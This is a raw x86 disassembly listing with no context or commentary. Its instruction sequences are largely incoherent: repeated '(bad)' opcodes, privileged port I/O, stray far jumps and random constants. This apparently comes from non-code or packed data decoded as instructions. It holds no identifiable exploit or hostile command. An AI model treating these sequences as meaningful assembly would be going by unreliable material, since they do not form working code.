  4246c3:	fmul   QWORD PTR [ecx-0x78]
  4246c6:	out    0x5e,al
  4246c8:	lock or BYTE PTR [ebp+ebp*1-0x5562cad8],cl
  4246d0:	retf   
  4246d1:	int    0xf2
  4246d3:	out    0x46,al
  4246d5:	xchg   edi,eax
  4246d6:	or     edx,DWORD PTR [esi-0x1d9ff61a]
  4246dc:	mov    ebx,0x84655ca1
  4246e1:	ds pop esi
  4246e3:	xlat   BYTE PTR ds:[ebx]
  4246e4:	(bad)  
  4246e6:	mov    edi,0x8e9834d
  4246eb:	push   ebp
  4246ec:	cmp    eax,0x574d501d
  4246f1:	shl    BYTE PTR [ebx+0x4d],cl
  4246f4:	mov    ds:0x66085468,eax
  4246f9:	jp     0x42472b
  4246fb:	mov    eax,ds:0x95063fa8
  424700:	fnstcw WORD PTR [eax+0x63]
  424703:	mov    cl,0x0
  424705:	dec    ebx
  424706:	pusha  
  424707:	pop    es
  424708:	adc    BYTE PTR [ebx+0x1],ch
  42470b:	mov    edi,fs
  42470d:	mov    ds:0xfce6a303,al
  424712:	adc    ch,BYTE PTR [edx+0x75]
  424715:	add    ebp,ebp
  424717:	rcl    DWORD PTR [edx-0x4bd64805],1
  42471d:	(bad)  
  42471e:	pushf  
  42471f:	scas   eax,DWORD PTR es:[edi]
  424720:	adc    DWORD PTR [esi],esp
  424722:	mov    eax,ds:0x8b430fa2
  424727:	mov    ds:0x41e3df7d,al
  42472c:	push   ebp
  42472d:	push   esp
  42472e:	xchg   esp,eax
  42472f:	jbe    0x424766
  424731:	je     0x424701
  424733:	mov    bh,0xc7
  424735:	je     0x424797
  424737:	inc    edi
  424738:	(bad)
  42473b:	lods   eax,DWORD PTR ds:[esi]
  42473c:	dec    esp
  42473d:	int3   
  42473e:	pop    ebx
  42473f:	stc    
  424740:	popa   
  424741:	enter  0x311b,0xb3
  424745:	cdq    
  424746:	aas    
  424747:	add    DWORD PTR [edx],edi
  424749:	cld    
  42474a:	popa   
  42474b:	adc    edi,DWORD PTR [edx]
  42474d:	cmp    al,0x28
  42474f:	mov    dl,0x59
  424751:	(bad)  
  424752:	retf   
  424753:	stos   DWORD PTR es:[edi],eax
  424754:	mov    edi,0x64e947e5
  424759:	mov    bl,0x33
  42475b:	push   cs
  42475c:	add    dl,cl
  42475e:	cli    
  42475f:	inc    ecx
  424760:	pop    ecx
  424761:	push   eax
  424762:	lds    ebp,FWORD PTR [ebx-0x31961341]
  424768:	pop    edx
  424769:	into   
  42476a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42476b:	mov    BYTE PTR [ebx+eax*4+0x2a],dl
  42476f:	cli    
  424770:	cwde   
  424771:	dec    edx
  424772:	pop    ss
  424773:	ja     0x42472e
  424775:	(bad)  
  424776:	std    
  424777:	push   esi
  424778:	ficom  WORD PTR [edi-0x3a8774aa]
  42477e:	and    ch,BYTE PTR [edi]
  424780:	push   cs
  424781:	sahf   
  424782:	jge    0x424739
  424784:	xor    bh,0xf1
  424787:	das    
  424788:	lds    esi,FWORD PTR [esi+0xe]
  42478b:	sti    
  42478c:	stc    
  42478d:	sbb    BYTE PTR [esi-0x35bea16],bh
  424793:	dec    eax
  424794:	or     BYTE PTR ds:0x7c8c6735,0x7f
  42479b:	mov    dh,0xb8
  42479d:	int3   
  42479e:	jae    0x424796
  4247a0:	dec    esp
  4247a1:	daa    
  4247a2:	imul   esi
  4247a4:	std    
  4247a5:	pusha  
  4247a6:	lea    eax,[ebx]
  4247a8:	xor    dh,BYTE PTR [ebx-0x2918068d]
  4247ae:	in     eax,dx
  4247af:	dec    edx
  4247b0:	jns    0x4247af
  4247b2:	loopne 0x42473c
  4247b4:	xlat   BYTE PTR ds:[ebx]
  4247b5:	or     BYTE PTR [ecx],bh
  4247b7:	xchg   edi,eax
  4247b8:	inc    ebx
  4247b9:	hlt    
  4247ba:	and    esp,eax
  4247bc:	push   edi
  4247bd:	xor    DWORD PTR [ecx+0x5c],ebx
  4247c0:	loopne 0x42476a
  4247c2:	in     eax,0x20
  4247c4:	or     ch,dl
  4247c6:	scas   eax,DWORD PTR es:[edi]
  4247c7:	retf   
  4247c8:	or     edi,ebp
  4247ca:	inc    edx
  4247cb:	in     eax,0x69
  4247cd:	add    BYTE PTR gs:[bx+si],al
	...
  4247d9:	add    BYTE PTR [edi+edi*4+0x63],bl
  4247dd:	push   eax
  4247de:	jecxz  0x4247bc
  4247e0:	jg     0x4247a1
  4247e2:	data16 adc al,0x63
  4247e5:	sbb    al,0x7c
  4247e7:	(bad)  
  4247e9:	push   esi
  4247ea:	stos   DWORD PTR es:[edi],eax
  4247eb:	rol    BYTE PTR [ecx],0x0
  4247ee:	std    
  4247ef:	add    DWORD PTR [eax],eax
  4247f1:	add    BYTE PTR [eax-0x5bf532e2],dl
  4247f7:	outs   dx,DWORD PTR ds:[esi]
  4247f8:	add    esi,eax
  4247fa:	cmp    ebx,DWORD PTR [edx+ebp*4]
  4247fd:	int3   
  4247fe:	dec    BYTE PTR ds:0x5e2fae2e
  424804:	jmp    0x1c04:0x6fda988a
  42480b:	lock adc DWORD PTR ds:0x57c0430f,eax
  424812:	ss mov dl,0xf
  424815:	xchg   edi,eax
  424816:	inc    ecx
  424817:	sbb    DWORD PTR [ebp+0x646b1986],ebx
  42481d:	dec    esp
  42481e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42481f:	mov    DWORD PTR [esi+0x4c],ebx
  424822:	mov    ecx,0xfd8f3793
  424827:	sbb    dl,BYTE PTR [esi]
  424829:	daa    
  42482a:	xor    eax,0x96eac934
  42482f:	inc    esi
  424830:	cmp    BYTE PTR [edi-0x3f4d77e9],bh
  424836:	ds stc 
  424838:	outs   dx,DWORD PTR ds:[esi]
  424839:	int3   
  42483a:	cmp    DWORD PTR [ecx+0x36d389a2],ebp
  424840:	outs   dx,BYTE PTR ds:[esi]
  424841:	aad    0x1d
  424843:	popf   
  424844:	ja     0x42480d
  424846:	mov    DWORD PTR [ecx+0x24],ecx
  424849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42484a:	jbe    0x42482d
  42484c:	ss out dx,al
  42484e:	lods   al,BYTE PTR ds:[esi]
  42484f:	stos   BYTE PTR es:[edi],al
  424850:	inc    edx
  424851:	test   al,0x29
  424853:	lea    ecx,[edx-0x2]
  424856:	cmp    cl,cl
  424858:	adc    eax,0xbf03bfd5
  42485d:	jp     0x424875
  42485f:	push   ecx
  424860:	dec    esp
  424861:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  424863:	sub    eax,0x93934165
  424868:	and    dh,al
  42486a:	sbb    BYTE PTR [ebp-0x16],dh
  42486d:	repz mov WORD PTR [edi+0x15],fs
  424871:	push   ebp
  424872:	push   ss
  424873:	out    dx,al
  424874:	pushf  
  424875:	mov    ah,0xdc
  424877:	stos   DWORD PTR es:[edi],eax
  424878:	inc    edx
  424879:	mov    eax,ds:0x5c93c804
  42487e:	aas    
  42487f:	cwde   
  424880:	rcl    eax,1
  424882:	mov    eax,ds:0x4aa19e3c
  424887:	and    eax,0xbb39bc5e
  42488c:	pusha  
  42488d:	push   cs
  42488e:	dec    eax
  42488f:	lea    ebx,[edx-0x6e]
  424892:	dec    eax
  424893:	sub    BYTE PTR [ecx+eax*8],0x8d
  424897:	repnz pop ebp
  424899:	or     ah,bh
  42489b:	mov    DWORD PTR [eax+0x7b],eax
  42489e:	xchg   esi,eax
  42489f:	popa   
  4248a0:	pop    es
  4248a1:	pop    edx
  4248a2:	xchg   ecx,eax
  4248a3:	push   esp
  4248a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248a5:	push   ecx
  4248a6:	jl     0x4248ab
  4248a8:	dec    ebx
  4248a9:	sub    al,0x77
  4248ab:	gs enter 0xd2af,0xf5
  4248b0:	dec    esi
  4248b1:	fsubr  st,st(5)
  4248b3:	and    al,0x61
  4248b5:	adc    BYTE PTR [edi+0x19217a57],ch
  4248bb:	pop    ebx
  4248bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248bd:	xchg   esp,eax
  4248be:	xchg   BYTE PTR [edi-0x47083210],bh
  4248c4:	or     eax,0xc58d7027
  4248c9:	sar    BYTE PTR [ebx-0x7798c240],0x67
  4248d0:	inc    esp
  4248d1:	xor    DWORD PTR [edi+0x1af6bcde],esp
  4248d7:	mov    edi,0x20624f3e
  4248dc:	idiv   DWORD PTR ds:0x811994e1
  4248e2:	sar    dl,0xff
  4248e5:	sbb    al,0x3e
  4248e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248e8:	xchg   esp,eax
  4248e9:	push   ebp
  4248ea:	mov    ds:0x60ac44d9,eax
  4248ef:	cmp    edi,ebx
  4248f1:	ficomp DWORD PTR [esi-0x64]
  4248f4:	lahf   
  4248f5:	add    BYTE PTR [esi+0x68e9ccc7],ch
  4248fb:	cs fwait
  4248fd:	or     ebp,eax
  4248ff:	xlat   BYTE PTR ds:[ebx]
  424900:	dec    eax
  424901:	aam    0x5
  424903:	mov    ch,0x68
  424905:	cwde   
  424906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424907:	inc    ebp
  424908:	mov    ebx,ecx
  42490a:	retf   
  42490b:	test   BYTE PTR [esi],0x11
  42490e:	fadd   DWORD PTR [edx-0x3f80d322]
  424914:	adc    dl,cl
  424916:	jmp    eax
  424918:	sub    bl,ah
  42491a:	fistp  QWORD PTR [edi]
  42491c:	push   ebx
  42491d:	cmp    al,0xd8
  42491f:	dec    edi
  424920:	and    eax,0x12babfd9
  424925:	push   ecx
  424926:	lock out 0x93,eax
  424929:	jae    0x4248ae
  42492b:	imul   ecx,DWORD PTR [esi+ebp*1+0x25],0xffffff97
  424930:	jb     0x424917
  424932:	cdq    
  424933:	inc    ebx
  424934:	fs push cs
  424936:	or     dl,BYTE PTR [esi]
  424938:	or     ah,BYTE PTR [ebp+0x62]
  42493b:	mov    dl,0x9b
  42493d:	xor    BYTE PTR [ebx+0x7e],cl
  424940:	lods   eax,DWORD PTR ds:[esi]
  424941:	test   DWORD PTR [eax],ebx
  424943:	mov    ds:0x3304fbd,eax
  424948:	es push esi
  42494a:	clc    
  42494b:	mov    cl,0x71
  42494d:	in     eax,0x4b
  42494f:	cmp    BYTE PTR [esi-0x4b35312b],0x7a
  424956:	test   bl,bh
  424958:	inc    ebp
  424959:	or     ebp,DWORD PTR [edi]
  42495b:	push   0xfffffff0
  42495d:	rol    DWORD PTR [ecx+edi*8-0x2c],1
  424961:	lea    ecx,[ecx-0x1d]
  424964:	test   DWORD PTR [ebp+0x5f],0xedc817f5
  42496b:	cmp    esi,DWORD PTR [eax-0x4c]
  42496e:	mov    edi,0xffeac466
  424973:	and    BYTE PTR [eax-0x54413c60],ch
  424979:	cli    
  42497a:	aam    0x3b
  42497c:	(bad)  
  42497e:	pop    ss
  42497f:	ret    0x6d05
  424982:	dec    ebx
  424983:	mov    ecx,0xac8a92cb
  424988:	xchg   esp,eax
  424989:	cdq    
  42498a:	in     eax,dx
  42498b:	call   0x3c00960f
  424990:	inc    ebx
  424991:	push   ebx
  424992:	adc    ecx,DWORD PTR [ebp-0xbadf9da]
  424998:	push   0xffffff93
  42499a:	mov    edi,edx
  42499c:	scas   eax,DWORD PTR es:[edi]
  42499d:	scas   eax,DWORD PTR es:[edi]
  42499e:	in     eax,0xfe
  4249a0:	pop    es
  4249a1:	enter  0x707a,0x8c
  4249a5:	repz in eax,dx
  4249a7:	sub    dl,cl
  4249a9:	jg     0x4249fd
  4249ab:	push   0x69fe209e
  4249b0:	add    bh,BYTE PTR [ebx+0x4ce1f518]
  4249b6:	(bad)  
  4249b7:	pop    esi
  4249b8:	shl    BYTE PTR [edi],1
  4249ba:	pop    esi
  4249bb:	xchg   edx,eax
  4249bc:	stc    
  4249bd:	shl    eax,0xb5
  4249c0:	and    ecx,ecx
  4249c2:	mov    ds,WORD PTR [edi-0x7d]
  4249c5:	scas   al,BYTE PTR es:[edi]
  4249c6:	ds xor eax,0x18ebf825
  4249cc:	into   
  4249cd:	inc    esi
  4249ce:	lods   al,BYTE PTR ds:[esi]
  4249cf:	xlat   BYTE PTR ds:[ebx]
  4249d0:	jp     0x424972
  4249d2:	push   cs
  4249d3:	pop    edi
  4249d4:	mov    WORD PTR [edi],?
  4249d6:	fmul   QWORD PTR [eax+0x60]
  4249d9:	xor    esp,DWORD PTR [ecx+esi*2+0x6e]
  4249dd:	pop    eax
  4249de:	xchg   ebp,eax
  4249df:	in     al,0x23
  4249e1:	jne    0x424a43
  4249e3:	and    ebp,edx
  4249e5:	xchg   ebx,eax
  4249e6:	out    0xb,al
  4249e8:	fsubrp st(7),st
  4249ea:	inc    esi
  4249eb:	call   0x48c3bf
	...
  4249f8:	add    BYTE PTR [eax],al
  4249fa:	inc    ebx
  4249fb:	push   ebp
  4249fc:	pusha  
  4249fd:	(bad)  
  4249fe:	jbe    0x4249bf
  424a00:	out    dx,eax
  424a01:	(bad)  
  424a03:	test   al,0x37
  424a05:	stos   DWORD PTR es:[edi],eax
  424a06:	rcr    BYTE PTR [ebx*2+0x1c2a8a2],0x0
  424a0e:	std    
  424a0f:	add    DWORD PTR [eax],eax
  424a11:	add    BYTE PTR [ecx-0x7f],ah
  424a14:	call   0x7a224580
  424a19:	fwait
  424a1a:	inc    edi
  424a1b:	int3   
  424a1c:	pop    ebp
  424a1d:	out    dx,al
  424a1e:	sbb    BYTE PTR [edx+0x3db5fd04],al
  424a24:	sti    
  424a25:	test   dl,bh
  424a27:	add    bh,cl
  424a29:	cmp    DWORD PTR [esi-0x29fae0a8],edi
  424a2f:	xchg   esp,eax
  424a30:	aam    0x63
  424a32:	cmp    DWORD PTR [eax+0x17],ecx
  424a35:	and    eax,0xb4e66a83
  424a3a:	call   0x5e3e9ea5
  424a3f:	mov    eax,0x2fc905a9
  424a44:	xor    ebp,DWORD PTR [edx+0x58381f52]
  424a4a:	adc    BYTE PTR [eax+0x2974e0d2],cl
  424a50:	xchg   esi,eax
  424a51:	iret   
  424a52:	js     0x4249f2
  424a54:	mov    ch,BYTE PTR [esp+eax*1+0x75]
  424a58:	pop    esp
  424a59:	dec    eax
  424a5a:	mov    eax,ds:0xad59c173
  424a5f:	imul   ebp,DWORD PTR [edx+0x5f],0xfe335f70
  424a66:	dec    edi
  424a67:	cdq    
  424a68:	cmp    eax,0xbac670c3
  424a6d:	adc    DWORD PTR [ebx-0x4fc68f86],esi
  424a73:	cdq    
  424a74:	push   0xe13bd1ca
  424a79:	cwde   
  424a7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a7b:	cld    
  424a7c:	das    
  424a7d:	xor    eax,0x164e63b2
  424a82:	call   0x18ab:0xd7171633
  424a89:	repz loop 0x424a2e
  424a8c:	lods   eax,DWORD PTR ds:[esi]
  424a8d:	push   edx
  424a8e:	jb     0x424a9f
  424a90:	js     0x424abe
  424a92:	mov    edx,0xaf0aeae1
  424a97:	call   0x8e6e:0x7314b638
  424a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a9f:	adc    ah,bh
  424aa1:	jno    0x424a63
  424aa3:	(bad)  
  424aa4:	xor    DWORD PTR [esi+0x243b3c50],esi
  424aaa:	and    al,0xa7
  424aac:	add    eax,0xa48c7e8c
  424ab1:	int    0x2f
  424ab3:	enter  0x1dfe,0xd9
  424ab7:	pop    eax
  424ab8:	jne    0x424b11
  424aba:	pop    ecx
  424abb:	xchg   edx,eax
  424abc:	push   esi
  424abd:	cdq    
  424abe:	dec    edi
  424abf:	push   eax
  424ac0:	pushf  
  424ac1:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ac3:	ret    
  424ac4:	ficomp WORD PTR [ebx-0x2ced7c4a]
  424aca:	inc    ebp
  424acb:	dec    esi
  424acc:	data16 jbe 0x424a67
  424acf:	dec    ecx
  424ad0:	shl    DWORD PTR [edi],1
  424ad2:	xor    eax,DWORD PTR [ecx+0x1b]
  424ad5:	jp     0x424a7b
  424ad7:	ficom  WORD PTR [ebx-0x9]
  424ada:	loopne 0x424aa2
  424adc:	loopne 0x424aa3
  424ade:	inc    ebx
  424adf:	shl    edi,0xa4
  424ae2:	sahf   
  424ae3:	xor    BYTE PTR [ebp-0x43],ah
  424ae6:	push   esi
  424ae7:	mov    dh,BYTE PTR [ecx-0x68]
  424aea:	dec    esp
  424aeb:	ja     0x424a8e
  424aed:	xor    BYTE PTR [esi],ah
  424aef:	mov    esi,0xccf9f824
  424af4:	pop    es
  424af5:	dec    eax
  424af6:	or     al,0x4a
  424af8:	ja     0x424b24
  424afa:	idiv   BYTE PTR [ecx-0x483992a5]
  424b00:	sbb    al,0xe
  424b02:	retf   
  424b03:	xchg   esp,eax
  424b04:	xor    DWORD PTR [edi],0xca6eee72
  424b0a:	add    DWORD PTR [edx+0x4e652b0f],ecx
  424b10:	(bad)  
  424b11:	xchg   ecx,eax
  424b12:	mov    esp,0xe452250c
  424b17:	inc    esp
  424b18:	pop    ebp
  424b19:	xor    al,0x45
  424b1b:	push   DWORD PTR [edi]
  424b1d:	push   edx
  424b1e:	adc    ah,bh
  424b20:	loope  0x424b61
  424b22:	mov    ah,0xd9
  424b24:	xlat   BYTE PTR ds:[ebx]
  424b25:	scas   eax,DWORD PTR es:[edi]
  424b26:	cmc    
  424b27:	add    BYTE PTR [ecx],cl
  424b29:	adc    DWORD PTR [ebx-0x41],eax
  424b2c:	retf   
  424b2d:	or     DWORD PTR [esi+0x55918e00],esi
  424b33:	xchg   edx,eax
  424b34:	mov    edx,0xc65b1594
  424b39:	inc    ebp
  424b3a:	into   
  424b3b:	mov    bl,0x34
  424b3d:	repz (bad) 
  424b40:	xchg   edx,eax
  424b41:	cwde   
  424b42:	cld    
  424b43:	xor    eax,0xe5abec1d
  424b48:	cli    
  424b49:	push   esp
  424b4a:	(bad)  
  424b4b:	jmp    0xe93516f6
  424b50:	out    dx,eax
  424b51:	mov    eax,0xb921e7da
  424b56:	and    ah,BYTE PTR [edi+0x5304465f]
  424b5c:	jmp    0x912:0x7c1761ab
  424b63:	add    ebx,DWORD PTR [ebp+0x65b5ed2c]
  424b69:	sub    eax,edi
  424b6b:	mov    edi,0xc4088798
  424b70:	mov    ch,0xd3
  424b72:	jmp    DWORD PTR [edx+0x750ea9f6]
  424b78:	jl     0x424bd2
  424b7a:	lock xor eax,0xbae19829
  424b80:	int3   
  424b81:	jp     0x424bb5
  424b83:	jle    0x424b3a
  424b85:	inc    esi
  424b86:	adc    al,0xbe
  424b88:	in     al,0x86
  424b8a:	popf   
  424b8b:	test   DWORD PTR [edx-0x40],ecx
  424b8e:	jnp    0x424b5b
  424b90:	add    bl,BYTE PTR [eax+0x6f]
  424b93:	stc    
  424b94:	mov    dl,0xbc
  424b96:	or     al,dl
  424b98:	inc    edx
  424b99:	shr    bh,0xcd
  424b9c:	dec    esp
  424b9d:	test   BYTE PTR [ebx*1-0xf97ef98],0xc6
  424ba5:	icebp  
  424ba6:	in     eax,dx
  424ba7:	jo     0x424b3e
  424ba9:	add    eax,0x2eceea7e
  424bae:	inc    esi
  424baf:	pop    esi
  424bb0:	retf   0xd8bd
  424bb3:	pusha  
  424bb4:	outs   dx,DWORD PTR ds:[esi]
  424bb5:	jb     0x424c04
  424bb7:	mov    al,ds:0xf8a06273
  424bbc:	cmp    BYTE PTR [eax+0x6699f9b0],cl
  424bc2:	sub    BYTE PTR [esi-0x2d],bl
  424bc5:	pop    es
  424bc6:	jg     0x424ba4
  424bc8:	ja     0x424b99
  424bca:	enter  0x9aea,0xce
  424bce:	loopne 0x424c2b
  424bd0:	out    dx,eax
  424bd1:	mov    ch,0x3f
  424bd3:	jb     0x424bcf
  424bd5:	mov    dh,0x7f
  424bd7:	addr16 mov al,ds:0x382c
  424bdb:	pop    es
  424bdc:	mov    cl,0xb6
  424bde:	jg     0x424b8d
  424be0:	(bad)  
  424be1:	lds    edi,FWORD PTR [ecx]
  424be3:	scas   al,BYTE PTR es:[edi]
  424be4:	cdq    
  424be5:	leave  
  424be6:	mov    ch,0xc5
  424be8:	test   esp,0xf8879ecd
  424bee:	aam    0xa2
  424bf0:	int3   
  424bf1:	js     0x424bd4
  424bf3:	stos   DWORD PTR es:[edi],eax
  424bf4:	in     eax,dx
  424bf5:	ds adc dh,bh
  424bf8:	sahf   
  424bf9:	mov    ecx,0xf1749530
  424bfe:	push   esi
  424bff:	xlat   BYTE PTR ds:[ebx]
  424c00:	rol    DWORD PTR [edi-0x3e29beb3],0x75
  424c07:	fwait
  424c08:	mov    al,ds:0x4dedb680
  424c0d:	out    0x9c,eax
	...
  424c17:	add    BYTE PTR [eax],al
  424c19:	add    BYTE PTR [edi+0x2d],dl
  424c1c:	pop    es
  424c1d:	call   0xe967:0xeddfba7f
  424c24:	addr16 xor al,0xc6
  424c27:	and    esp,eax
  424c29:	shl    BYTE PTR [ebp-0x2fffe3c],cl
  424c2f:	add    DWORD PTR [eax],eax
  424c31:	add    BYTE PTR [edx-0x65],ch
  424c34:	or     al,0xe
  424c36:	jns    0x424c55
  424c38:	and    ecx,DWORD PTR [edx]
  424c3a:	cmp    eax,0x6f40bc9e
  424c3f:	rcr    DWORD PTR [esi],1
  424c41:	sbb    al,0xa8
  424c43:	mov    ch,0x82
  424c45:	push   esi
  424c46:	dec    ebx
  424c47:	or     eax,0x2fefd2cc
  424c4c:	dec    eax
  424c4d:	lea    eax,[ecx-0x75]
  424c50:	jmp    0xdc5dbb12
  424c55:	push   ebx
  424c56:	jo     0x424c7b
  424c58:	mov    eax,0x2ba1202a
  424c5d:	adc    DWORD PTR [esi+0x1c69d7ce],0x1c
  424c64:	das    
  424c65:	pop    ecx
  424c66:	int    0xef
  424c68:	popf   
  424c69:	and    eax,DWORD PTR [eax-0x74c30d32]
  424c6f:	adc    al,0xe6
  424c71:	adc    al,0x94
  424c73:	push   0x2bb025e3
  424c78:	aam    0x5e
  424c7a:	mov    cl,0x6d
  424c7c:	jl     0x424c2d
  424c7e:	xor    ebp,DWORD PTR [esi+edx*4]
  424c81:	gs push ebx
  424c83:	dec    esi
  424c84:	fidivr DWORD PTR [esi+0x44]
  424c87:	out    dx,eax
  424c88:	jmp    0xa56e80c2
  424c8d:	xchg   esp,eax
  424c8e:	pop    esi
  424c8f:	mov    bl,0x39
  424c91:	push   esi
  424c92:	retf   
  424c93:	hlt    
  424c94:	pop    esi
  424c95:	leave  
  424c96:	int3   
  424c97:	out    0x46,eax
  424c99:	mov    cl,0xe5
  424c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c9c:	js     0x424c42
  424c9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c9f:	mov    ebx,0xb2fdb0b9
  424ca4:	sahf   
  424ca5:	div    DWORD PTR [ebx-0x13]
  424ca8:	ret    
  424ca9:	scas   al,BYTE PTR es:[edi]
  424caa:	leave  
  424cab:	jne    0x424c81
  424cad:	xor    DWORD PTR ds:0x513af403,ebp
  424cb3:	add    eax,0x4a6820d
  424cb8:	cld    
  424cb9:	xor    bh,BYTE PTR [esi+0x10]
  424cbc:	pop    ebx
  424cbd:	jns    0x424c56
  424cbf:	aaa    
  424cc0:	std    
  424cc1:	inc    edx
  424cc2:	inc    edi
  424cc3:	leave  
  424cc4:	je     0x424cd9
  424cc6:	rcl    DWORD PTR [ebp-0xb077099],0xa7
  424ccd:	retf   0x52f5
  424cd0:	add    al,0xbf
  424cd2:	push   0x31
  424cd4:	iret   
  424cd5:	xchg   esi,eax
  424cd6:	pop    edi
  424cd7:	leave  
  424cd8:	adc    al,0x60
  424cda:	ja     0x424cc1
  424cdc:	into   
  424cdd:	cs ret 
  424cdf:	aam    0xf
  424ce1:	adc    DWORD PTR [edi+0x340aa17c],eax
  424ce7:	(bad)  
  424ce8:	stos   DWORD PTR es:[edi],eax
  424ce9:	push   es
  424cea:	or     DWORD PTR [edx],esi
  424cec:	arpl   WORD PTR [esi+0x4ab4c348],sp
  424cf2:	dec    edi
  424cf3:	jg     0x424ced
  424cf5:	adc    DWORD PTR [edi+0x462bf48c],esp
  424cfb:	xchg   DWORD PTR [ebp+ebp*8+0x61],ebx
  424cff:	cmp    eax,0x557304da
  424d04:	sbb    BYTE PTR [bx],ah
  424d07:	fadd   DWORD PTR [ebp+ebx*4+0x72]
  424d0b:	push   edx
  424d0c:	xchg   DWORD PTR [ebx-0x2ed22c3a],esi
  424d12:	sub    edx,ebp
  424d14:	jl     0x424d60
  424d16:	jb     0x424cd6
  424d18:	call   0x54437b0b
  424d1d:	inc    edi
  424d1e:	mov    ds:0xfb666b25,al
  424d23:	imul   ecx,edx,0x2e
  424d26:	xchg   esi,eax
  424d27:	addr16 out 0xc8,al
  424d2a:	and    eax,0x409f2b24
  424d2f:	jge    0x424d86
  424d31:	inc    cx
  424d33:	retf   
  424d34:	cld    
  424d35:	mov    esi,0xd9443c1
  424d3a:	lea    esi,[edi]
  424d3c:	stc    
  424d3d:	push   ebp
  424d3e:	into   
  424d3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d40:	mov    esi,0xbb070091
  424d45:	sub    eax,0xde38c7fb
  424d4a:	jns    0x424cd3
  424d4c:	int3   
  424d4d:	les    eax,FWORD PTR [ebp+edi*4-0x7a42f431]
  424d54:	loope  0x424d2a
  424d56:	repnz push esi
  424d58:	sub    eax,0xd38c65f1
  424d5d:	xor    esi,esi
  424d5f:	fcmovnb st,st(0)
  424d61:	loopne 0x424d50
  424d63:	xchg   edx,eax
  424d64:	and    ch,BYTE PTR [edx+esi*1+0x69]
  424d68:	xor    al,0x96
  424d6a:	pop    edi
  424d6b:	mov    ch,0xd3
  424d6d:	cmp    dl,BYTE PTR [ebx+0x2134b3ea]
  424d73:	xchg   ecx,eax
  424d74:	scas   al,BYTE PTR es:[edi]
  424d75:	xor    BYTE PTR [eax+0x66],0x1d
  424d79:	call   0x503b5e07
  424d7e:	in     eax,dx
  424d7f:	xchg   BYTE PTR [ebp+eax*2+0x42],cl
  424d83:	sbb    bl,BYTE PTR [ebx+0x77c729f6]
  424d89:	fstp   QWORD PTR [eax+0x42]
  424d8c:	stos   DWORD PTR es:[edi],eax
  424d8d:	xchg   ecx,eax
  424d8e:	mov    edi,DWORD PTR [edx-0x2f382ef9]
  424d94:	or     ah,BYTE PTR [edx-0x58]
  424d97:	inc    esp
  424d98:	js     0x424e05
  424d9a:	inc    esp
  424d9b:	jae    0x424d53
  424d9d:	inc    ebp
  424d9e:	dec    ebx
  424d9f:	dec    edx
  424da0:	and    al,0x34
  424da2:	jmp    0x9236498f
  424da7:	pop    ecx
  424da8:	and    al,0x68
  424daa:	not    ecx
  424dac:	mov    al,0xb6
  424dae:	lock clc 
  424db0:	push   ss
  424db1:	dec    ebp
  424db2:	out    dx,eax
  424db3:	sbb    BYTE PTR [esi],bh
  424db5:	jle    0x424dc2
  424db7:	rcl    BYTE PTR [esi+0xb],0xb8
  424dbb:	(bad)  
  424dbc:	ret    0x5d57
  424dbf:	cwde   
  424dc0:	push   ebx
  424dc1:	(bad)  
  424dc2:	sti    
  424dc3:	out    0xb9,al
  424dc5:	jo     0x424d8c
  424dc7:	bnd ret 0xfe24
  424dcb:	xchg   ebp,eax
  424dcc:	out    dx,al
  424dcd:	ss out 0x89,al
  424dd0:	in     eax,dx
  424dd1:	iret   
  424dd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424dd3:	(bad)  [edx+0xaa3d774]
  424dd9:	add    al,0x15
  424ddb:	repnz sbb al,0xbe
  424dde:	xchg   esp,eax
  424ddf:	mov    dh,0xca
  424de1:	mov    ebp,0xcbf171f2
  424de6:	inc    edx
  424de7:	outs   dx,BYTE PTR ds:[esi]
  424de8:	pop    ebp
  424de9:	jmp    0x71d52ade
  424dee:	mov    bh,0x7b
  424df0:	aaa    
  424df1:	cmp    eax,ebp
  424df3:	pop    edi
  424df4:	hlt    
  424df5:	ins    DWORD PTR es:[edi],dx
  424df6:	xor    eax,0x7172d303
  424dfb:	sub    al,0x54
  424dfd:	pop    esp
  424dfe:	lea    esi,[esi]
  424e00:	fimul  DWORD PTR [ebx+0x78]
  424e03:	shl    BYTE PTR [eax+0x365a8462],cl
  424e09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424e0a:	iret   
  424e0b:	call   0x7cb07c6b
  424e10:	repnz mov ebx,DWORD PTR [ecx]
  424e13:	out    0x3d,al
  424e15:	fadd   st(4),st
  424e17:	dec    ecx
  424e18:	pushaw 
  424e1a:	mov    al,cs:0xb77f0767
  424e20:	mov    edi,0xbea988a0
  424e25:	pop    ss
  424e26:	ja     0x424e04
  424e28:	cmp    DWORD PTR [esi],esi
  424e2a:	adc    eax,eax
  424e2c:	int3   
  424e2d:	jne    0x424e3f
	...
  424e37:	add    BYTE PTR [eax],al
  424e39:	add    BYTE PTR [edx+ebp*1+0x2b],ch
  424e3d:	outs   dx,DWORD PTR es:[esi]
  424e3f:	daa    
  424e40:	ins    DWORD PTR es:[edi],dx
  424e41:	push   0xffffffda
  424e43:	add    BYTE PTR [ecx],0x9d
  424e46:	xchg   ecx,eax
  424e47:	fst    QWORD PTR [ebx+0x1c6a251]
  424e4d:	add    ch,bh
  424e4f:	add    DWORD PTR [eax],eax
  424e51:	add    BYTE PTR [eax+ecx*1+0x5c],cl
  424e55:	retf   
  424e56:	adc    ch,BYTE PTR [eax+0x73838d49]
  424e5c:	push   edx
  424e5d:	fwait
  424e5e:	dec    edx
  424e5f:	repz mov bh,0xd3
  424e62:	and    al,al
  424e64:	icebp  
  424e65:	mov    ah,BYTE PTR [esp+ecx*4+0x6b443e89]
